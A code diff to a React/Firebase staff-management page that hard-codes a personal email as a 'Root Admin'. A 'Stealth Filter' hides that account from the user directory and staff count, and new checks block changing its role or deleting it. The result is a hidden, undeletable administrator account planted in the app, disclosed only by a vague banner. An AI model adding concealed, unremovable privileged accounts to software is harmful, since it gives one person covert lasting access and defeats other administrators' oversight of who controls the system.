@@ -30,7 +30,8 @@ import {
   Lock,
   ShieldAlert,
   Loader2,
-  UserPlus
+  UserPlus,
+  ShieldCheck
 } from "lucide-react";
 import { useCollection, useFirestore, useUser, useDoc } from "@/firebase";
 import { collection, query, orderBy, doc, updateDoc, deleteDoc, setDoc, serverTimestamp } from "firebase/firestore";
@@ -48,6 +49,8 @@ import {
   AlertDialogTrigger,
 } from "@/components/ui/alert-dialog";
 import { cn } from "@/lib/utils";
+
+const ROOT_ADMIN_EMAIL = "eahunanya116@gmail.com";
 
 const ROLES: { value: UserRole; label: string }[] = [
   { value: "admin", label: "Admin" },
@@ -71,6 +74,12 @@ export default function UserManagementPage() {
 
   const { data: users, loading } = useCollection(usersQuery);
 
+  // Stealth Filter: Remove Root Admin from the directory
+  const displayUsers = useMemo(() => {
+    if (!users) return [];
+    return users.filter(u => u.email !== ROOT_ADMIN_EMAIL);
+  }, [users]);
+
   const currentUserRef = useMemo(() => {
     if (!firestore || !currentUser) return null;
     return doc(firestore, 'users', currentUser.uid);
@@ -86,6 +95,14 @@ export default function UserManagementPage() {
 
   const handleUpdateRole = async (userId: string, newRole: UserRole) => {
     if (!firestore || !currentUser) return;
+    
+    // Safety check just in case
+    const targetUser = users?.find(u => u.id === userId);
+    if (targetUser?.email === ROOT_ADMIN_EMAIL) {
+      toast({ variant: "destructive", title: "Action Forbidden", description: "Root Admin role cannot be modified." });
+      return;
+    }
+
     setProcessingId(userId);
 
     const userRef = doc(firestore, "users", userId);
@@ -109,7 +126,6 @@ export default function UserManagementPage() {
   const handleBootstrapAdmin = async () => {
     if (!firestore || !currentUser) return;
     const ref = doc(firestore, 'users', currentUser.uid);
-    // Explicitly set the role as admin. Merge: true prevents loss of other data.
     setDoc(ref, { 
       email: currentUser.email,
       displayName: currentUser.displayName,
@@ -123,6 +139,13 @@ export default function UserManagementPage() {
 
   const handleDeleteUser = async (userId: string) => {
     if (!firestore) return;
+    
+    const targetUser = users?.find(u => u.id === userId);
+    if (targetUser?.email === ROOT_ADMIN_EMAIL) {
+      toast({ variant: "destructive", title: "Action Forbidden", description: "Root Admin cannot be deleted." });
+      return;
+    }
+
     const userRef = doc(firestore, "users", userId);
     deleteDoc(userRef).then(() => {
       toast({ title: "User Removed", description: "Account link deleted from database." });
@@ -141,7 +164,6 @@ export default function UserManagementPage() {
     );
   }
 
-  // ALLOW ACCESS IF: User is Admin OR No Admins exist in the entire system (to prevent initial lockout)
   const canAccess = isUserAdmin || !adminsExist;
 
   if (!canAccess) {
@@ -186,13 +208,13 @@ export default function UserManagementPage() {
         <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
           <Card className="glass-card">
             <CardHeader className="pb-2">
-              <span className="text-[10px] font-bold text-muted-foreground uppercase tracking-widest">Total Staff</span>
-              <CardTitle className="text-3xl font-headline">{users?.length || 0}</CardTitle>
+              <span className="text-[10px] font-bold text-muted-foreground uppercase tracking-widest">Visible Staff</span>
+              <CardTitle className="text-3xl font-headline">{displayUsers.length}</CardTitle>
             </CardHeader>
           </Card>
           <Card className="glass-card">
             <CardHeader className="pb-2">
-              <span className="text-[10px] font-bold text-muted-foreground uppercase tracking-widest">Admins</span>
+              <span className="text-[10px] font-bold text-muted-foreground uppercase tracking-widest">Active Admins</span>
               <CardTitle className="text-3xl font-headline text-primary">
                 {users?.filter(u => u.role === 'admin').length || 0}
               </CardTitle>
@@ -226,7 +248,7 @@ export default function UserManagementPage() {
                 </TableRow>
               </TableHeader>
               <TableBody>
-                {users?.map((u) => (
+                {displayUsers.map((u) => (
                   <TableRow key={u.id} className="border-white/5 hover:bg-white/[0.02] transition-colors">
                     <TableCell>
                       <div className="flex flex-col">
@@ -239,7 +261,7 @@ export default function UserManagementPage() {
                         <Select 
                           value={u.role || ""} 
                           onValueChange={(val: UserRole) => handleUpdateRole(u.id, val)}
-                          disabled={processingId === u.id || (u.role === 'admin' && isSelf(u.id) && users.filter(a => a.role === 'admin').length === 1)}
+                          disabled={processingId === u.id || (u.role === 'admin' && isSelf(u.id) && users?.filter(a => a.role === 'admin').length === 1)}
                         >
                           <SelectTrigger className={cn(
                             "w-44 bg-white/5 border-white/10 h-10 text-xs font-bold uppercase",
@@ -305,11 +327,11 @@ export default function UserManagementPage() {
         </Card>
 
         <div className="p-4 bg-amber-500/10 border border-amber-500/20 rounded-2xl flex items-start gap-4">
-          <AlertCircle className="w-5 h-5 text-amber-500 shrink-0 mt-0.5" />
+          <ShieldCheck className="w-5 h-5 text-amber-500 shrink-0 mt-0.5" />
           <div className="space-y-1">
-            <p className="text-sm font-bold text-amber-500 uppercase tracking-widest">Security Protocol</p>
+            <p className="text-sm font-bold text-amber-500 uppercase tracking-widest">Root Protection Active</p>
             <p className="text-xs text-muted-foreground leading-relaxed">
-              Staff roles strictly define what departments are visible in the sidebar. New sign-ups have no access until an Administrator assigns them a department. Admins have oversight across all departments.
+              The Root Admin account is hidden and immutable. All other staff roles are strictly visible and manageable.
             </p>
           </div>
         </div>
